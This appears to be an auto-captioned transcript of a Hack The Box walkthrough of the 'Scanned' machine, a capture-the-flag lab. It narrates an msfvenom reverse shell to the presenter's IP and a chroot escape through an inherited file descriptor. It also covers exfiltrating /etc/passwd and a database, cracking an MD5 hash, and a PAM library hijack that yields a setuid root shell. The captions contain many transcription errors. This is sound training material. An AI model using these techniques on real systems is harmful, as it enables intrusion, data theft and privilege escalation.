 what's going on YouTube this is ipsack me doing scan from hack the box which is probably one of my favorite boxes which is weird for me to say because it's an insane binary exploitation box and I don't generally like binary exploitations but this challenge doesn't involve any type of overflow Heap or those things instead it's all about exporting a CH root jail first you have to abuse an open file Handle by another process to escape the jail and then for the prevask you abuse the fact that you can write into the jail before things are executed and perform a path hijack because you can just execute a set uid binary but you control the libraries you can do a Constructor to get code execution before the set uid binary actually runs and this is all tied together with a beautiful story because it's a realistic application that's a malware sandbox you give it a program it runs it and gives you pretty much like the S Trace output of everything so with all that being said let's just jump in as all always going to start off with an end map so Dash SC for default scripts SV enumerate versions OA I'll put all formats put in the nmap directory and call it scanned the IP address of 1010 11.141 this can take some time to run so I've already ran it looking at the results we see just two ports open the first one being SSH on Port 22 and its Bandit tells us it's a Debian box the second thing we have is HTTP on Port 80. its Banner tells us its engine X and the title of the page is malware scanner so let's just go take a look at the website so 1010 11.141 and we get a page that just says it's Mouse scanner a brand new totally free and open source malware analysis sandbox so how does it work um simply just upload untrusted executables here and it will run in a safe environment and output a list of all this as calls and arguments and we also have the source code so I'm going to download the source code and we'll move it over into a directory but first let's just see what it does so copy that here and we go to upload a sample and we have to create a malicious by whoa it doesn't have to be malicious but let's just create a binary I'm going to start with msf Venom so msf Venom Dash p Linux x64 shell underscore reverse TCP L host is going to be 10 10 14 8 my IP teleport is 9001 the format we want is elf and the name will just be called um rev shell I guess so we'll let this run and then when we upload it uh we'll see if we get a call back so nclvmp 9001. so this is doing two things it's going to um tell us if we have a network connection and it's also going to just show us what this website looks like so htb scanned rev shell let's upload it submit the query and I'm looking at my terminal I'm not getting a connection back it's still running and we got output but no connection and we can see we got high priority Sysco so we can see the socket the connect um this isn't an IP it's probably the location where my IP is the result looks like it's negative 65 hex so this is probably since it's negative saying um could not connect and then tries to do exactly e things we've got medium priority assist calls and then low so just reading files they think that's low it's pretty nice how it's organized and then a bunch of sys calls that it doesn't map that just says ignored so we can see how this works um let's now go over and view the source code so make the source and then tar Dash x v f Source like this and we have Mouse scanner if I look at Mouse scanner look at requirements.txt we can see this is just a Django website I'm not too interested in how the website works I'm more interested in the sandbox so it looks like it's just a small C program I'm going to open it up in Visual Studio code so let's do file open folder and then hdb scanned um Source sandbox and we can look at make file to see exactly what this looks like um makes a directory jails does GCC it's setting capabilities on this um whatever it compiles and clean will delete it so nothing too interesting there let's look at sandbox.c because this is where main is going to be so we can see it starts out doing check caps if we look at it it's just checking if capabilities exist and it's nice and commented so if we don't read the code we can get an idea I'm not going to go over like everything in this program instead we're going to just learn by exploring it because I find that to be the easiest way um let's see we got this function make jail right now I'm just trying to get to the part of the program where it's executing our thing so it looks like this binary is going to create the jail so it's opening a handle to the folder jails and it's current working directory if it can't open it says the name exists um I guess this is probably gonna be a permission denied air if it can't create the jail um and then program I'm guessing this is going to be the program that we pass in so it's also making sure it can access the program it's not executing it yet it's going to change into the um jails directory then name this is probably going to be um just a name for running the program we don't know what this is yet then it's going to copy the libraries into the jail it's going to do namespaces that's going to copy a program into the jail and it's going to CH root which is going to just create a I don't want to say container but just create a segmented environment and then set GID effective GID user ID and effective user ID so sending the group and user to be 1001 and then executing do Trace and it's also important to note I think only root can do a CH root so we know this code probably is running as root or it has the capability if we looked at all the capabilities earlier I'm guessing we would have got it um so do Trace is probably going to be in tracing.c and right now it looks like um it's setting the dumpable capability removing capabilities and let's see trying to think what is important here um it's going to create child and then Fork so this is probably going to be um PID 2. because the jail it's going to start at pid1 which is this program itself and then child the first Fork is pid2 and then killer this is probably going to be pid3 and of course um pid1 is this program well I guess we could call um do log pid1 because it's executing this function but not doing a fork so it stays in this parent process um let's look at exactly what um do child is so if we look at new child it's going to prevent the job process from escaping CH root by closing jails FD now this is going to be super important um because the process we're in doesn't have an open handle to the jails FD if we go back to that Jail's FD is just a pointer to the jails directory and if this was not closed well we're going to see what happens if this isn't closed because it's going to be open in uh the parent process which is pid1 and we can go into proc one to get into that process and then slash it's going to be I think at three because standard and out error is zero one two so the next open file would be three and that's going to be a pointer to this directory and because we have that pointer to this directory that's outside of a jail we can abuse it to get to all the other directories outside of a jail because essentially all the CH root does it's not like a permissions thing you just can't get to the directories because you don't have pointers to them I want to say it's I nodes but it's probably not that but from in your CH root you just have no knowledge of what's outside of it so it leaving this handle open in the parent process because it only closes in the child gives a program or exploit a way to see what's outside of CH root and access everything else so let's look at what the do Trace does then so do killer this is going to sleep five seconds and then kill the process so do log is what we want to see maybe let's see yeah do log is going to um P trace the running program and then output all the syscalls so it's doing a p Trace so if you ever did like s trace on a program I know we've done that plenty of times on this video essentially that's what it's doing to this program and it's going to dump everything with this log syscall function and if we look at what this does is It's recording all the registers and we can see all the registers are unsigned long which are going to be eight bytes I'll show you how to verify that later because if well we'll go into it a minute um so eight bytes 888 so this is going to be eight things which is 64 bytes and it's going to write that into slash log and when it does it it's making this 777 so we can edit slash log so what a goal is is our program is going to run it's going to overwrite slash log and then put information here which lets us run and get information out of this sandbox right so we'll be using these syscalls As an X Bill path which is really cool but first how do we know this is going to be a bytes because if we go over to Google and say unsigned long size Google says four bytes and I think that's probably going to be like a 32-bit thing so let's just go and create a quick program so I'm going to call this getsize.c I guess and we're just going to say int Main and then we want to do unsigned long um let's just call Rax and then we can do a print f size percent I like that and then the variable Rax and we want to do size of and then close this so if we do GCC get size and execute what it gives us we see eight so we now know this is gonna be eight bytes and this is going to be important because this page here has the Sysco and the syscall is going to be Rax because that's just how assembly works and then it's telling us what the output is so that's going to be the return I would guess so we want to create a program that writes um something in RDX that we can pull and then skips over all the bytes to get to the return and write something else so let's create Please Subscribe dot C and just like last time we can do it main um we're going to want to include standard io.h ope okay so the first thing we want to do is create a file pointer to um a file and I'm just going to write it to out for output and the reason why we do this because at the end of the program we're going to rename slash out to slash log and the reason we do that is again because this page is generated based upon the output of Slash log um I'm not just writing everything straight to slash log because I want to clobber slash log and then just put my thing in so I'm only saying data that we wanted at xfill if we just wrote to slash log it would just be mixed in with all the other syscalls right we just want to delete log and recreate it so now we want to write to slash out so I'm going to do F well first we should Define the sizes to make it easy so first I'm going to do unsigned care Cisco and this is going to be the first eight bytes of it and I'm just going to do one and then we'll do seven zeros so one two three so that's four we need four more that should be eight one two three four five six seven eight good um the next thing we probably want to do is create a junk so we don't have to just um write it every time so unsigned care junk and remember we have 64 bytes we have to write the last eight are going to be um the return value so that gets us to 56. so we probably want 48 so 64 minus 16 is what I just did so junk 48 and we're going to Define all of that as in all bytes zero okay so now we want to F right the syscall that's going to write one and then a bunch of zeros and write from one to eight and we write it to the pointer then we're going to do the same thing but this time we're going to do junk I'm going to write the whole size of junk so 1 through 48 bytes and then this next piece we're going to write please ask you this is eight characters uh I think one two three four five six seven eight so one eight FP okay and then we're going to do subscribe I'm gonna whoops write this up here so I make sure it's eight characters without having to count B subscribe we can add an exclamation point okay so what this should be doing is we're going to open a handle to L right the syscall and then a bunch of the seven blank bytes so right one then Z seven null bytes then we're going to fill it up with 48 more null bytes because that's going to be all the other registers that's this data we don't care about that because the web page isn't outputting that information for us and then we got return which is going to be this one so let's try compiling this so GCC please subscribe I probably forgot a semicolon there we go and if we run this so browse let's do exploits a DOT out submit it and we'll see what happens here waiting on it and we have low priority assist calls three ignored ciscals so this is probably just it exiting or something but we have these rights and right if we look at a syscall table is syscall one so if we did Sysco let's say two real quick so let's change this to two I want to say two is read I'm not positive but let's just see what this does waiting on it so we can see medium oh it's open so these are the first three arguments so we could also put data here because we're controlling this but we just got the return values here so I'm going to go to cyber chef so we can quickly um paste this so we want to copy or decode it let's see there we go there's dark mode okay so we want to go from hex and it's kind of garbled I'm going to swap the ndns real quick uh let's see word length eight there we go so we swapped the endiance and then display the hex and we see please subscribe so we have now validated we can exfil information through this um the one thing I'm going to do is a little bit of style points because the Cisco is just going to be hex and I'm going to write 0x39 0x uh Five O five and what this is going to do again this is ndns so we're doing 255 five times and then going up 39 and if you can do math or if I do math correctly we will see what that syscall gets translated to so submit query waiting on it so it's now in ignored syscalls and we just see sis Lee is equal to or please subscribe so this is great um it's a bit of a pain having to um do this through the web GUI every time so let's just switch over real quick create a python script to submit it for us actually before we do that I want to intercept this call to see the level of effort it's going to be because this is Django they could enable like server side request uh csrf tokens and things like that which don't make it impossible it just makes it a pain um I want to go to The Intercept tab where are you Target proxy there we go so let's see what this looks like a DOT out submit query and we can look at it it's just a post to scan or upload and we don't have anything it's just uploading a um file so this should be super easy to code and Python and that just sends us a 302 redirect for where we want to go so let us create a upload.pi okay so we need to do our Imports so of course we need requests uh we need regular expressions and I'm going to use struct so we can copy the hex which will be this data back into ASCII so the very first thing we need to do is um open the file I'm going to do it in a way where we can just easily reuse this and we need the name to be file so we do file colon open a DOT out which is going to be a binary and we open as our B so this should be the file parameter for a request module so we can do R is equal to request.post HTTP 10 10 11 141 scanner upload and then files is equal to files and now the next piece we need to do is a regular expression so p is equal to r e dot compile and then we want to match everything that begins with sysleite and I'm going to use a wildcard so I don't have to worry about escaping these parentheses so CIS underscore Fleet then dot star equal space and now we should be at this spot so we're just going to say 0x and now we just want to match any hexadecimal so and this is the match we want to extract this information so I put it in parentheses and we can do 0 to 9 a through f like that and we need to match all the characters and then what comes after it's probably going to be like an angled bracket or something like that so this should be fine and we need to close I think that's good and then the matches is going to be our e dot find all p r dot text and we can say for data in matches let's just print the data now to see if it works python3 upload.pi so now it is uploading and hopefully we just get two hex values back and we don't get anything um that sucks so let's do print or dot text to see what the page looks like so we do have this and I'm going to do online regex I'm just going to use an automated or not automated but a web tester and I want to copy my regex in like this paste and we're not matching so let's see CIS underscore I'm guessing because I was talking and typing at the same time but that should work so we run upload again and we get two hex values awesome so let's get rid of that run and we get it so now that all that's left is to convert that back into ASCII so we're going to use struct and then pack and the format let's see python struct Ure I think it's Q so let's see we want integer 8 bytes it looks like we do either lowercase and uppercase q okay and then we do integer data and 16 for hex so I'm going to put this we can say oh God no I don't know how to redo that um let's just reheat type it start pack Q and data 16. and we can say out equals and print out so I run this again we get a syntax error of course there we go run it and hopefully we get please subscribe we kind of do so we want to decode it and then we also want to get rid of the line break that's default with print so we do end equals double parentheses so now when we run this we just get Please Subscribe and I guess at the end of the program we can put a blank line break but now we can automate or upload and x-fill so the next piece we want to get into is implementing an LS and that is just so we can list files now we can't just use like P open or system to execute bin LS because it doesn't exist in the jail we could use this CH root escape to run LS off the host system however in order to understand the CH root Escape I found this to be super helpful just being able to run LS and poke at the file system right so let us copy Please Subscribe over to ls.c and then pretty much all the code um I got from open dirt example off of Google so just go to stack overflow and I'm pretty much copying the code and just using it as I see fit so the first thing we need to do is include d-i-r-e-n-t dot h I think it stands for like directory entry and I'm going to create a new function called LS and we're going to pass it the directory and there's going to be something weird that I do with this um we're going to write the output to a file and then read the file um it'll make sense once we go on but in order to convert the output into the slash log this just makes it easier and we can reuse the file read later so let's do file we need another pointer and this is going to be where we write the results of the ls we're just going to write it to back slash dur and we do that and then we need the structure set for the directory entry so now we can open dur on directory and we'll pass this directory in and then a while is equal to reader and if that's not null we want to um right so we do it f puts directory and then D name is the file name into FP and then we want to write a line break also to FP and we can close this pointer so this command should just write a directory listing I'm going to change this real quick to just slash dur so we can test it out and I'm going to comment out this rename um actually we can just delete those and we just want to test this so care directory is equal to slash I need a semicolon and then LS directory like this so if we run it cat dir we get a directory listing of Slash awesome so I'm going to put this lash back because we want this just helps keep track of where it is and then this next piece we want to Loop over this output and write it in the weird format we want which is um 64 bytes but the last eight bytes are actual data so I'm going to create um something called content I would Define it right now as all null bytes but this is going to be the return actually let's just call it red because that is what the return of our fake syscall is so that makes sense so we ran LS so now we need to do another file pointer um we can do it now let's do and we're going to call this maybe FP output I guess or we'll call this read file like this I don't know a good thing to call it but it's FP read file is going to be equal to F open and then slash dir because that's where you wrote everything to we open that in read mode and then I'm going to create a variable read and we'll set it to zero and now we're going to do a another loop so read is equal to F read and then this is going to be where the data goes we're going to put it into rhet and then 1 8 for the eight bytes of data and it is coming from FP read file and we continue until there's no data left and now we can do F rights so we write the Sysco 1 8 into um just FP this is going to be the slash output and then the next piece we write is junk and this is going to be 48 bytes that's all the other registers and now we want to write our return okay and now we want to close a pointer so F close FP and then F close FP read file and then we rename okay GCC to compile it and now the Moment of Truth does this work first try do we have a functional LS we do so now we can OS around and if you remember the code it copied user probe this is a program um so that's why it's executing here in the child we can see copying program to use a prog so this is the thing we uploaded dir this is going to be our output file log is what we overwrote but let's go into proc so let's do os.c and the directory we want to LS is slash proc so we GCC it again Python 3 upload and now we're going to be looking at all the um processes or the proc directory and we can see there's three processes um this is going to be the main process this is the one we want this is our programs and this is going to be killer we went over that a little bit before this just leaves for five seconds I think and then kills so let's look at the file descriptors for one so let's do ls.c and we'll change directory to be proc1 FD to see if we can read this compile it run it and waiting for it to run we just get zero one two three I don't know where this came from but um we have file descriptors now if we test this out so I'm going to uh let's see let's Vim let's go in source actually we called it exploits one of them please subscribe dot C I'm gonna do a PS Dash EF on V or Vim and we can see that's PID 1832119 so I'm gonna do LS proc1832199 FD we can see all the file descriptors open by this uh just quite a bit more and we can see they're all Sim links right this one is going to the Vim swap file we got some pipes so this is the data we want unfortunately her um Open Door call doesn't follow Sim links so we're gonna have to modify that to print out the SIM link information so I'm going to copy ls.c and I'm going to call this LS Sim dot C I guess I don't know OS Dash read link will probably be better so let's edit that file and we need to add a call to read link and I think it's going to be easier if we just create variables for the link and file name so I'm going to do care link name 64. and it should be with noted um this code is got awful and there's buffer overflows everywhere um but hopefully we don't hit any of those this should be enough space for both the link name and the absolute name which is going to be the file name so the first thing we need to do is let's see I wonder if we should put this in a loop probably so what we can do is a St or a cat to concatenate things and we want to build the absolute name so ABS name and the first thing it's going to be is the directory and then after the directory [Music] um we want the file name so ABS name d-i-r-d name okay so absolute name this is going to be like slash proc FD um three yeah so that's like an example uh proc actually I forgot the PID so let's see now we have the cat we need to do the read link so read link the absolute name of the file then we put it to the link name and we can do size of Link name and then I always do -1 to account for if it has a line break which I don't think it does I don't think we have to but that should be fine and that's writing it into link name so now we do all the F puts so we wrote the directory name instead of a line break let's just do a tab and then we can do a let's do something like that I guess and we want to do link name and now line break so I think that is all we need uh those are all warnings so that should be fine so Python 3 upload.pi and let's see what this output looks like hopefully it all works because this is a pain to debug and it does not oh man that is ugly so what do we have screwed up so we go in this we Define absolute name and Link name and directory let's see what directory set at oh uh we didn't put a trailing slash on this so it was probably just fd3 and screwed up so let's try this again and see what happens now there we go so these don't have anything we should have put like if then to only display this Arrow if there is a link but we can see Zero is mapped to Dev null uh this is an out probably or probably out and error there's probably no standard in um those are sockets but we see three is mapped to verb dub dub dub Mouse scanner sandbox jails so because this exists outside of the CH root and we have a handle to it we can do just a standard like lfi so we can go dot dot slashes right and then Etsy pass WD so let us look let's copy ls.c I'm going to call this read file.c and this is going to be y we wrote this to a directory to make it super easy so I'm just going to delete the ls because we don't care about it here we can get rid of that and FP read file and instead of Slash Dura we just do proc one fd3 and then a few dot dot slashes Etsy pass WD so this is mapped to the verb www malware scan or whatever and we're just doing directory for traversal going up and reading past WD so let's GCC we called it read file and now let's just run the upload script and we get the output of pass WD I'm not sure what this nol is but we know this is from the box because we got sandbox which is a user I don't have a my box it looks like the user for this is clearance as well so now we can read files outside of um or jail so the next step is to now look at the Django code the web code because since we can read files is there anything sensitive in the web always my first bet once I get shell on a web server is to dump the database so I'm looking at the web code here which is the Django and we got mail scanner.db so this is where we want to go um I'm going to let's see what do we call it wasn't read link yeah we want read link again I think trying to think if we know exactly where this is running I don't think no so let's do GCC LS read link upload it because that leaks a path that I want to use so I think it's just Vera dub dub dub Mouse scanner then sandbox jails so I'm going to do Mel scanner and then let's see it's either Mouse scanner Mouse scanner then mouse scanner.db or just mousecanner.db most likely so let's copy this and then look at read file we can paste this and I'm just going to do mouse scanner dot DB and we'll see if the file is here um is there a read binary in this I wonder if we should have been using that let's see I think that's all we need GCC read file.c upload takes a few seconds and we'll see what happens I'm guessing our python code will probably error because we got this UTF codec can't decode byte so we should just write this to a file because [Music] um the database is going to have non-ascii characters so I'm going to say f is equal to open I'm going to call it Mouse scanner let's see CP upload upload to dot pi and this will be f is equal to open mail scanner.db write binary like that and we just want to write this so F dot right out so I think that's all we need python3 upload two dot pi run it again file Mouse scanner.db is a sqlite database so sqlite3 dot dump and it is corrupted but if we run a strings against it we can see data so this should be fine potentially um right here I see an md5 hash and I'm guessing it stops right here because this is where 2021 is and it's for clearance so V hashes dot text we got that um let's see grep md5 is there any other it looks like that is the only one so we should try cracking this hash so I'm going to go over to the Kraken which is just a box on my network you can use hash count on your main computer I just don't like doing it when I'm recording because um it's very CPU intensive I don't want like Drop frames and things like that so um let's get the hash of I think I put in exploits cat hashes dot text and what we're going to do is figure out the format for this so the hashes scan Dot md5 because this isn't a real hash format we do have md5 telling us it's that and two dollar signs so um one's probably the salt one's the password and if we go to hashcat example hashes it gives us an idea how this works so pulling this up it's either probably going to be 10 or 20. either the password and assaults at the end of the password where you have the salt and then the password is at the end of that so if you don't know all salt is it's a random thing that's put before password to prevent rainbow style attacks so if your password was Please Subscribe and the salt was like a static sort for everything and the sort was IP then would be it please subscribe with it before or Please Subscribe if afterwards and it just makes it tougher for pre-computed attacks to take advantage of it especially if the salt is random because it essentially makes every password somewhat random so let's go and figure this out the example format puts the md5 looking thing first and then this and right off the bat I know this is going to be the md5 looking thing because this is hex and capital L is not valid so let's put this at the end like that I think it started with K I would hope it did uh what was it hold on DW and P okay there we go that's what I wanted so let's try dot slash hashcat mode 20 hashes scan.md5 and then opt word list Rock UDOT text to see if it cracks in this format generally most salts are going to be before the password um and we get recovered one and the password is one day you feel like crying so let's copy this and V password dot text and we don't know where this password goes to so we probably should have saved the output of etsy pass WD but we can just join it again um so instead of this we can just put the file back to Etsy pass WD and run it and see what we get so Etsy pass WD and V I think upload.pi just prints it yep so python well GCC read file then python3 upload.pi this should get us the past ABD file probably should have wrote to a directory so we could grep this because we want to look for everything that ends in sh because those would be valid accounts we could potentially log in as uh let's see there we go that clipboard third time is the charm uh gret pass WD let's scrap everything that ends in sh so there's only one user on the box with that so let's get password.txt again and try sshing as clearance so SSH clearance at 10 10 11 141 paste it in the password and we get logged in so now we are a user on scanned this next part is relatively straightforward but does involve a lot of just Linux internal knowledge and just abusing the CH root so we know that the sandbox is Inver www malware scanner and if we go into the sandbox there is this binary that the website executes so if I do lsgl's it's empty but if we run our upload script and look at jails we now have the md5 sum and if we go in here uh we actually can't because we don't have execute permission on this I think or read um so we can't look at that jail but if we execute the binary it wants a program and a uuid the uid is just going to be what the jail gets called so I'm just going to pass it bin Su it doesn't matter what program we put and then we put anything we want for the jail name so I'm going to put ipsec here right and right off the bat we get an error of it trying to run Su because it can't load any shared libraries because this jail is super strict lockdown but if I go into the jails directory we can see there's now ipsec because that's what this jail is so doing an LS here we can see user probe this is going to be md5 sum and the trick here with exploiting ch Roots is this is the root file system as far as the program is concerned so if we find a way to copy all the libraries in here and execute the Su program it's going to have set uid and we do some type of path hijack thing and get our library to execute code that we want and because it's got set uid permission because that's what Su has on this file system we can escalate back up to root so this whole sandbox it starts as root the drop of permissions down to the sandbox user and what we're going to do is use Su and path hijacking to elevate ourselves back up to root and then escape the jail again so again this whole thing is off the premise that number one we can write a library into this jail and number two it's a CH root so when the set uibd binary goes into like lib library.so.0 whatever it tries to load we can control that Library so the first step is to run ldd which is going to show all the libraries the program needs remember we ran bin Su it said we couldn't um load a library right so all these files here is what we need to put in because this elf binary Su is expecting libpam SEO it's going to be expecting it at this directory right so what I'm going to do is just go into temp I'm going to make a directory lib and we're just going to copy each of these into lib so we can copy copy copy this we probably should do a loop um libc is there already so we don't want to copy that one again although I don't think it would hurt anything but just a few more this one and this one and we just copy this into the director we just created and we have to pick a library we want to use with this and I think the one that makes the most sense is just the lid Pam miscellaneous because it's probably going to be used the least amount lib pans if I use thoroughly and we just have to match the exports because if a library is calling lib Pama trying to load it and load something that this uses and it's not there then the program is going to crash before we can get code execution so um we're going to choose the lib Pam miscellaneous.so and all we're going to do is create a function that executes a command that we want and whenever it loads that Library it does that so I'm going to call this lib Pam miscellaneous.c and what we need to do is create a Constructor so I'm going to Google C library Constructor and we're just going to copy some code because I never remember exactly the header so this will be called First and this is called last so let's create this and the constructors get called before main I'm just going to rename this to exploit and we want to copy this paste exploit and this is all the code we'll want to run so I'm going to do a set effective uid 0 and also a set uid 0. and then we also want to do that with GID so effective GID 0 and set GID 0. and there's no reason I'm not putting this on four lines other than this is just how I'm used to writing it um the next thing we need is to create a file name so care file name and this is going to be proc1 fd3 and this is going to be a binary we want to interact with so we're going to make this a um set uid shell so tap Please Subscribe will be just a shell that executes bash and we do this to escape the sandbox the proc1fd and now we want to set the permissions on this so I'm going to do 4755 and we need to um make the permissions an integer to pass it to the command so we're going to do string too long and we'll do perm zero eight I think that's how we do it in this and now we can do a CH own so F name and then we want to do zero zero to make it root owned and then a CH mod F name and then the permissions so we'll do I perm um we probably need to include a few things so I'm just going to copy this stdio okay and now we can try compiling so GCC shared because it's a library we want to position independent uh lib Pam isc.c and um we'll call it lid Pam misc uh we have a few things but I think the compiler fixes for us it's because we didn't include a library so I'm going to move lib Pam misc over top of a current one okay and we actually want to create a new program as well that we're going to be uploading so let's see I'm going to copy the read file.c I'm going to call it exact file.c and let's see instead of this F open I'll do a p open I think that's pretty much it and we'll do bin SU Ben SU uh we don't need read binary and now before we do this we do want to call asleep so I'm going to sleep for two seconds and the reason we do this is because when we run this program we want we don't want to execute Su right away because we have to copy the files into the jail so I'm going to GCC exec file I think we got it I'm just going to call this um root me we have it python3 Dash M HTTP server and we can download the root me okay so I think let's just make everything executable because we're lazy I think we're all good so let's go back into VAR dub dub dub Mouse scanner go into sandbox and we're going to run actually I'm going to get a command ready so CP temp uh lib star I'm going to copy it to jails zero um ldd Ben SU CP templib stir to jails zero in this directory okay and I did that so I can run this command very fast so I'm going to do dot slash sandbox temp root me our attempt lib root me and then zero and put this in the background and then immediately copy all the libraries in there so now when um SEO is ran we get this here and we have a undefined symbol this um miscellaneous converter so remember when I said we had to get all the exports in this is because we're missing something so let's go back into templib go into uh where is the dot C libpammisc dot C and we just want to create the function and it's going to do nothing um we just have to have it there so if it tries to load it it can I do that right I believe so so shared and I will just copy it over top of the right file like that I don't see any error I'm just going to remove this run it again I should fix my code so we don't get all those warnings but I think we're good that just got created so let's redo what we had just oh um I forgot one last thing we have this code right uh lib Pam misc and it's executing Please Subscribe uh we have to make that set uid binary so I'm just going to CP been bash because I'm lazy over to Temp please subscribe that's what he called it right yes so we do lsla on temp please subscribe we see it's owned by Clarence not set uid so now when we go into uh www Mouse scanner sandbox and do we still have that jail there we do uh what's the date I think it clears every like five or ten minutes so let's get a CP command back up uh what was it if I do slash zero like that I'm going to copy it to one and we'll do dot slash sandbox write it to one and do this fast and let's see user root does not exist or the entry does not contain all the required fields so I'm not sure exactly what that error is if we do lsla on temp we see please subscribe is owned by root so it probably just kept going on and tried to execute the Su program and uh just failed but we have Please Subscribe and it's set uid so if I execute Please Subscribe do ID we are not root because we probably have to add the dash P flag to take advantage of the set uid and do ID and now we are root so if I do CD slash root we can get to root dot text and if you want to know more about that if we do man bash and search for Dash p let's see effective group so yeah this just takes advantage of the set uid I don't want to read this whole command prompt if it's not sticking right out but um yeah so hope you guys enjoyed the Box take care and I will see you all next week